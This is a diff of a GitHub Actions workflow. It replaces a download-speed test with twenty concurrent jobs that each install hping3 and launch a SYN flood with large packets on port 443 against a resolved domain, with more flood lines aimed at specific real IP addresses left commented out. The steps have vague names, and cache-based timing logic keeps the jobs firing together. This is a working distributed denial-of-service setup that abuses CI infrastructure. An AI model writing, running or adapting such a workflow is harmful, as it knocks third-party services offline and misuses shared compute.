@@ -1,7 +1,5 @@
 on:
   push:
-    # paths:
-    #   - '.github/workflows/download.yml'
   workflow_dispatch:
 
 concurrency:
@@ -10,24 +8,19 @@ concurrency:
 
 env:
   TZ: Asia/Shanghai
-  TASK_COUNT: 1600
+  TASK_COUNT: 450
 
 jobs:
   prepare-matrix:
     runs-on: ubuntu-latest
     outputs:
       ids: ${{ steps.set-matrix.outputs.ids }}
-      matrix_ready_at: ${{ steps.set-matrix.outputs.matrix_ready_at }}
     steps:
-      - uses: actions/checkout@v4
       - id: set-matrix
         run: |
           count=20
           ids=$(jq -c -n --argjson n "$count" '[range(1; $n+1)]')
-          # 输出 matrix 启动准备完成的时间
-          matrix_ready_at=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
           echo "ids=$ids" >> $GITHUB_OUTPUT
-          echo "matrix_ready_at=$matrix_ready_at" >> $GITHUB_OUTPUT
 
   concurrent-jobs:
     needs: prepare-matrix
@@ -38,14 +31,27 @@ jobs:
       fail-fast: false
       matrix:
         job_id: ${{ fromJson(needs.prepare-matrix.outputs.ids) }}
+
     steps:
-      - name: 检查队列等待时间
+      - name: 记录开始时间
+        id: start
+        run: echo "start_time=$(date +%s)" >> $GITHUB_OUTPUT
+
+      - name: 检查首个job完成时间
+        id: check_time
+        uses: actions/cache/restore@v4
+        with:
+          path: matrix_first_finished_time.txt
+          key: matrix-first-finished-${{ github.run_id }}
+
+      - name: 判断是否需要退出
+        if: steps.check_time.outputs.cache-hit == 'true'
         run: |
-          MATRIX_READY_AT="${{ needs.prepare-matrix.outputs.matrix_ready_at }}"
-          QUEUE_TIME=$(( $(date -u +%s) - $(date -d "$MATRIX_READY_AT" +%s) ))
-          echo "Queue time since matrix ready: $QUEUE_TIME seconds"
-          if [ "$QUEUE_TIME" -gt 180 ]; then
-            echo "::error::Queue time since matrix ready exceeded 180 seconds."
+          first_done=$(cat matrix_first_finished_time.txt)
+          my_start=${{ steps.start.outputs.start_time }}
+          echo "First: $first_done, Mine: $my_start"
+          if [ "$my_start" -gt "$first_done" ]; then
+            echo "::error::当前job启动时间晚于首个job完成时间"
             exit 1
           fi
 
@@ -53,71 +59,52 @@ jobs:
         with:
           repository: mirllan2025/express
 
-      - id: run-speed
-        name: 下载并统计速度
+      - name: Step 1
         run: |
+          sudo apt install hping3 -q
           yarn
           timeout 600s node index.js --count ${{env.TASK_COUNT}}
-          # 下载文件并获取速度（字节/秒）
-          url=https://apt.mobileanjian.com/debs/old/com.cyjh.mobileanjian_1.8.1_default_iphoneos-arm.deb
-          resolve=apt.mobileanjian.com:443:114.80.179.141
-          # url=https://down-syouwan-com-1301430143.cos.ap-shanghai.myqcloud.com/myt.ipa
-          # resolve=down-syouwan-com-1301430143.cos.ap-shanghai.myqcloud.com:443:117.68.24.87
-          result=$(curl -O "$url" -w "remote_ip: %{remote_ip}\nspeed_download: %{speed_download}\n" --resolve $resolve 2>/dev/null)
-          remote_ip=$(echo "$result" | grep "remote_ip" | awk '{print $2}')
-          speed=$(echo "$result" | grep "speed_download" | awk '{print $2}')
-          echo "remote_ip: $remote_ip"
-          echo "speed_download: $speed"
-          # 转换为 MB/s，保留两位小数
-          speed_mb=$(awk "BEGIN {printf \"%.2f\", $speed/1024/1024}")
-          echo "$speed_mb" > speed.txt
-          timeout 600s node index.js --count ${{env.TASK_COUNT}} --path /download --value $speed_mb
 
-      - name: 上传下载速度结果
-        uses: actions/upload-artifact@v4
-        with:
-          name: speed-${{ matrix.job_id }}
-          path: speed.txt
-
-  summarize:
-    needs: concurrent-jobs
-    runs-on: ubuntu-latest
-    if: always()
-    steps:
-      - name: 下载所有下载速度文件
-        uses: actions/download-artifact@v4
-        with:
-          path: speeds
-
-      - name: 汇总分析下载速度
+      - name: Step 2
         run: |
-          # 合并所有下载速度
-          cat speeds/speed-*/speed.txt > all_speeds.txt
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.11 || true
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 137.220.188.12 || true
 
-          # 统计分析
-          sum=0
-          max=0
-          min=10000
-          count=0
-          speeds_list=""
-          while read s; do
-            sum=$(awk "BEGIN{print $sum+$s}")
-            if (( $(awk "BEGIN{print ($s>$max)}") )); then max=$s; fi
-            if (( $(awk "BEGIN{print ($s<$min)}") )); then min=$s; fi
-            count=$((count+1))
-            speeds_list="${speeds_list}${count}|${s}\n"
-          done < all_speeds.txt
-          avg=$(awk "BEGIN{print $sum/$count}")
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 182.16.89.10 || true
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 182.16.89.11 || true
+          # sudo timeout 10s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 180.178.38.85 || true
+          
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 154.198.240.70 || true
 
-          # 输出到 workflow summary
-          {
-            echo "### 下载速度统计"
-            echo ""
-            echo "|编号|速度 (MB/s)|"
-            echo "|---|---|"
-            echo -e "$speeds_list"
-            echo ""
-            echo "**平均速度：$avg MB/s**"
-            echo "**最高速度：$max MB/s**"
-            echo "**最低速度：$min MB/s**"
-          } >> $GITHUB_STEP_SUMMARY
+          # Alibaba
+          IP="80ym.com"
+          TIMEOUT=2
+
+          # Cloudflare
+          # IP="www.gname.com"
+          # TIMEOUT=0
+
+          # 如果不是IPv4地址，则认为是域名，去解析
+          if [[ ! $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+              IP=$(dig +short "$IP" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -n 1)
+          fi
+
+          sudo timeout $TIMEOUT hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 $IP || true
+
+      - name: 再次检查首个job完成时间
+        id: double_check
+        uses: actions/cache/restore@v4
+        with:
+          path: matrix_first_finished_time.txt
+          key: matrix-first-finished-${{ github.run_id }}
+
+      - name: 保存首个job完成时间
+        if: steps.double_check.outputs.cache-hit != 'true'
+        run: date +%s > matrix_first_finished_time.txt
+
+      - name: 缓存首个job完成时间
+        if: steps.double_check.outputs.cache-hit != 'true'
+        uses: actions/cache/save@v4
+        with:
+          path: matrix_first_finished_time.txt
+          key: matrix-first-finished-${{ github.run_id }}
